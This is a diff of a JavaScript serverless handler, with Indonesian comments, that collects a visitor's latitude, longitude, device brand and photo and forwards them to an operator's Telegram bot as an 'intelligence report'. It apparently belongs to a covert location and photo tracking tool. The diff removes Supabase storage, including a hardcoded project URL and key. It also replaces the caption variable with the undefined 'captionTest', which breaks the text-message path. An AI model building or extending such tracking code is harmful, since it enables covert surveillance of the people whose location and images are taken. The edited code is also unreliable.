@@ -1,10 +1,5 @@
 const axios = require('axios');
 const FormData = require('form-data');
-const { createClient } = require('@supabase/supabase-js');
-
-const supabaseUrl = 'https://idjfzymaywdimpfgkncq.supabase.co';
-const supabaseKey = 'sb_publishable_OWuwBk7doR0laJLJG4IPsQ__cZgh0h7';
-const supabase = createClient(supabaseUrl, supabaseKey);
 
 export default async function handler(req, res) {
     if (req.method !== 'POST') {
@@ -25,23 +20,6 @@ export default async function handler(req, res) {
     else if (/vivo/i.test(userAgent)) deviceModel = 'Vivo';
     else if (/realme/i.test(userAgent)) deviceModel = 'Realme';
 
-    // 1. Simpan ke Database Supabase (Aman dengan Try-Catch terpisah)
-    if (latitude && longitude) {
-        try {
-            await supabase.from('locations').insert([
-                { 
-                    latitude: parseFloat(latitude), 
-                    longitude: parseFloat(longitude), 
-                    accuracy: accuracy ? String(accuracy) : '-', 
-                    device_model: deviceModel 
-                }
-            ]);
-        } catch (err) {
-            console.log("Error Supabase:", err.message);
-        }
-    }
-
-    // 2. Kirim Notifikasi & Foto ke Telegram
     try {
         const captionText = `🚨 **Laporan Intelijen & Perangkat** 🚨\n\n` +
             `📱 **Merek HP:** ${deviceModel}\n` +
@@ -62,7 +40,7 @@ export default async function handler(req, res) {
         } else {
             await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                 chat_id: chatId,
-                text: captionText,
+                text: captionTest,
                 parse_mode: 'Markdown'
             });
         }
